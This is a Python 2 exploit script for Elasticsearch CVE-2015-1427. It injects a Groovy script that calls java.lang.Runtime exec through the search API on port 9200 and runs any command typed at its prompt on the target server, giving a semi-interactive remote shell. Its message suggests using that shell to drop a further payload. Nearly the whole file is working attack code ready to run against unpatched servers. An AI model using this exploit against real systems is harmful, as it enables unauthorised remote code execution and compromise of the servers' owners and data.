#!/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150309.1
# Licence: WTFPL - wtfpl.net
import json
import requests
import sys
import readline
readline.parse_and_bind('tab: complete')
readline.parse_and_bind('set editing-mode vi')
__version__ = "20150309.1"

def banner():
    print """\x1b[1;32m
▓█████  ██▓    ▄▄▄        ██████ ▄▄▄█████▓ ██▓ ▄████▄    ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓█   ▀ ▓██▒   ▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▓██▒▒██▀ ▀█  ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒███   ▒██░   ▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▒██▒▒▓█    ▄ ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒▓█  ▄ ▒██░   ░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ░██░▒▓▓▄ ▄██▒  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▒████▒░██████▒▓█   ▓██▒▒██████▒▒  ▒██▒ ░ ░██░▒ ▓███▀ ░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░   ░▓  ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░░ ░▒  ░ ░    ░     ▒ ░  ░  ▒   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
   ░     ░ ░    ░   ▒   ░  ░  ░    ░       ▒ ░░        ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░  ░    ░  ░     ░  ░      ░            ░  ░ ░            ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                                              ░                                                
 Exploit for ElasticSearch , CVE-2015-1427   Version: %s\x1b[0m""" %(__version__)

def execute_command(target, command):
    payload = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" %(command)
    try:
        url = "http://%s:9200/_search?pretty" %(target)
        r = requests.post(url=url, json=payload)
        print r
    except Exception, e:
        sys.exit("Exception Hit"+str(e))
    values = json.loads(r.text)
    print values
    fuckingjson = values['hits']['hits'][0]['fields']['lupin'][0]
    print fuckingjson.strip()
        

def exploit(target):
    print "{*} Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something"
    while True:
        cmd = raw_input("~$ ")
        if cmd == "exit":
            sys.exit("{!} Shell exiting!")
        else:
            execute_command(target=target, command=cmd)
    
def main(args):
    banner()
    if len(args) != 2:
        sys.exit("Use: %s target" %(args[0]))
    exploit(target=args[1])

if __name__ == "__main__":
	main(args=sys.argv)
